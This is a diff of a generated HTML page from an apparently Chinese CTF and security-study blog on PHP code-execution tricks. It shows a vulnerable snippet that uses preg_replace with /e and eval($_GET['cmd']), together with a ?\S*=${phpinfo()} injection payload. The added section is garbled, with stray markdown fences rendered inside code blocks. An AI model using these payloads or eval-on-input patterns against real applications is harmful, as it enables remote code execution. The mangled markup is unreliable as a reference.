@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2023-11-07T09:56:28.000Z">
-<meta property="article:modified_time" content="2024-01-23T02:40:42.476Z">
+<meta property="article:modified_time" content="2024-04-01T06:10:59.742Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="基础漏洞">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~23.34K
+                        ~23.46K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1705977642476"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1711951859742"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -273,11 +273,14 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>/e</code>在php7已经不支持，php5.5已经弃用</p>
 <p>可以执行第二个参数的内容，换句话说这里可以执行<code>strtolower(&quot;\\1&quot;);</code></p>
-<h3><span id> $</span></h3>
-<p><code>$&#123;&#125;</code>能直接调用函数内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
-<h3><span id="header_register_callback"> header_register_callback</span></h3>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header_register_callback</span>(<span class="string">&#x27;phpinfo&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>一般来说是利用<code>.*</code>的，但是php的get此请求一般传不了<code>.</code></p>
+<p>所以我们改用<code>\S*</code>来代替</p>
+<p>换句话讲其实是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### $</span><br><span class="line"></span><br><span class="line">`$&#123;&#125;`能直接调用函数内容：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>${phpinfo()}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### header_register_callback</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">header_register_callback(&#x27;phpinfo&#x27;);</span><br></pre></td></tr></table></figure>
 <p>无参数的callback</p>
 <h2><span id="php函数"> PHP函数</span></h2>
 <h3><span id="passthru-system"> passthru、system</span></h3>
@@ -588,7 +591,7 @@
                     <a class="tag-none-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-01-23T02:40:42.476Z" itemprop="dateModified">最后编辑：2024-01-23</time>
+                    <time datetime="2024-04-01T06:10:59.742Z" itemprop="dateModified">最后编辑：2024-04-01</time>
                 </div>
             </div>
         </footer>
@@ -705,7 +708,7 @@
                 文章
             </span>
             <span class="count">
-                46
+                47
             </span>
         </a>
         <a class="meta-item" href="/categories/">
@@ -755,6 +758,12 @@
         
           
           
+            <a class="list-group-item" href="/posts/6701.html"><i class="fa  fa-book"></i> PicoCTF2024 Web Writeup</a>
+            
+          
+        
+          
+          
             <a class="list-group-item" href="/posts/40439.html"><i class="fa  fa-book"></i> NKCTF2024 Write Up</a>
             
           
@@ -778,11 +787,7 @@
           
         
           
-          
-            <a class="list-group-item" href="/posts/13343.html"><i class="fa  fa-book"></i> 简单看看环境变量劫持</a>
             
-          
-        
           
             
           
